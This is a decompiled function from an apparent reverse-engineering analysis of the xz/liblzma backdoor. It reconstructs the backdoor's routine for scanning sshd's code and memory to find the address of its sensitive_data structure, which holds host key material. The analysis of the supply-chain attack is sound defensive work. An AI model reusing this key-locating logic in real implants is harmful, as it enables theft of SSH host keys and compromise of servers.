// /home/kali/xzre-ghidra/xzregh/103680_sshd_get_sensitive_data_address_via_xcalloc.c
// Function: sshd_get_sensitive_data_address_via_xcalloc @ 0x103680
// Calling convention: __stdcall
// Prototype: BOOL __stdcall sshd_get_sensitive_data_address_via_xcalloc(u8 * data_start, u8 * data_end, u8 * code_start, u8 * code_end, string_references_t * string_refs, void * * sensitive_data_out)


/*
 * AutoDoc: Locates the call site that matches the cached xcalloc reference, walks the following basic
 * block looking for the MOV/LEA that parks the return value in .bss, and collects up to sixteen
 * such stores. Whenever it sees three consecutive slots separated by 8 bytes (pointer,
 * pointer+8, pointer+0x10) it treats the lowest address as the sensitive_data candidate
 * generated during sshd's early zero-initialisation.
 */
#include "xzre_types.h"


BOOL sshd_get_sensitive_data_address_via_xcalloc
               (u8 *data_start,u8 *data_end,u8 *code_start,u8 *code_end,
               string_references_t *string_refs,void **sensitive_data_out)

{
  u8 *call_target;
  byte bVar1;
  BOOL BVar2;
  long lVar3;
  long lVar4;
  long lVar5;
  long *plVar6;
  undefined4 *puVar7;
  u8 *puVar8;
  ulong uVar9;
  byte bVar10;
  undefined1 uVar11;
  dasm_ctx_t insn_ctx;
  long store_hits [16];
  u8 *xcalloc_call_target;
  undefined1 local_100 [27];
  u8 hit_count;
  undefined4 local_e4;
  byte local_e0;
  u8 *local_d0;
  long local_a8 [16];
  
  *sensitive_data_out = (void *)0x0;
  call_target = (u8 *)string_refs->entries[0].func_start;
  if (call_target == (u8 *)0x0) {
    return FALSE;
  }
  uVar11 = 0xff;
  puVar8 = (u8 *)0x0;
  bVar10 = 0;
  plVar6 = local_a8;
  for (lVar3 = 0x20; lVar3 != 0; lVar3 = lVar3 + -1) {
    *(undefined4 *)plVar6 = 0;
    plVar6 = (long *)((long)plVar6 + 4);
  }
  puVar7 = (undefined4 *)local_100;
  for (lVar3 = 0x16; lVar3 != 0; lVar3 = lVar3 + -1) {
    *puVar7 = 0;
    puVar7 = puVar7 + 1;
  }
LAB_001036eb:
  do {
    if ((code_end <= code_start) ||
       (BVar2 = find_call_instruction(code_start,code_end,call_target,(dasm_ctx_t *)local_100),
       BVar2 == FALSE)) goto LAB_00103802;
    code_start = (u8 *)(((dasm_ctx_t *)local_100)->instruction + ((dasm_ctx_t *)local_100)->instruction_size);
    BVar2 = find_instruction_with_mem_operand_ex
                      (code_start,code_start + 0x20,(dasm_ctx_t *)local_100,0x109,(void *)0x0);
  } while (BVar2 == FALSE);
  if ((((dasm_ctx_t *)local_100)->prefix.flags_u16 & 0x1040) == 0) {
LAB_00103788:
    if (uVar11 != 0) {
      code_start = (u8 *)(((dasm_ctx_t *)local_100)->instruction + ((dasm_ctx_t *)local_100)->instruction_size);
      goto LAB_001036eb;
    }
  }
  else {
    if ((((dasm_ctx_t *)local_100)->prefix.flags_u16 & 0x40) != 0) {
      uVar11 = *(((u8 *)&local_e4) + 2);
      if ((((dasm_ctx_t *)local_100)->prefix.flags_u16 & 0x20) != 0) {
        bVar1 = hit_count * '\x02';
LAB_00103782:
        uVar11 = uVar11 | bVar1 & 8;
      }
      goto LAB_00103788;
    }
    if ((((dasm_ctx_t *)local_100)->prefix.flags_u16 & 0x1000) != 0) {
      uVar11 = local_e0;
      if ((((dasm_ctx_t *)local_100)->prefix.flags_u16 & 0x20) != 0) {
        bVar1 = hit_count << 3;
        goto LAB_00103782;
      }
      goto LAB_00103788;
    }
  }
  if (((((dasm_ctx_t *)local_100)->prefix.flags_u16 & 0x100) != 0) && (puVar8 = local_d0, (local_e4 & 0xff00ff00) == 0x5000000)
     ) {
    puVar8 = local_d0 + ((dasm_ctx_t *)local_100)->instruction + ((dasm_ctx_t *)local_100)->instruction_size;
  }
  if ((data_start <= puVar8) && (puVar8 < data_end)) {
    uVar9 = (ulong)bVar10;
    bVar10 = bVar10 + 1;
    local_a8[uVar9] = (long)puVar8;
    if (0xf < bVar10) {
LAB_00103802:
      lVar3 = 0;
      do {
        if ((uint)bVar10 <= (uint)lVar3) {
          return FALSE;
        }
        lVar4 = 0;
        do {
          lVar5 = 0;
          do {
            if (((void *)local_a8[lVar3] == (void *)(local_a8[lVar4] + -8)) &&
               (local_a8[lVar4] == local_a8[lVar5] + -8)) {
              *sensitive_data_out = (void *)local_a8[lVar3];
              return TRUE;
            }
            lVar5 = lVar5 + 1;
          } while ((uint)lVar5 < (uint)bVar10);
          lVar4 = lVar4 + 1;
        } while ((uint)lVar4 < (uint)bVar10);
        lVar3 = lVar3 + 1;
      } while( TRUE );
    }
  }
  uVar11 = 0;
  code_start = (u8 *)(((dasm_ctx_t *)local_100)->instruction + ((dasm_ctx_t *)local_100)->instruction_size);
  goto LAB_001036eb;
}

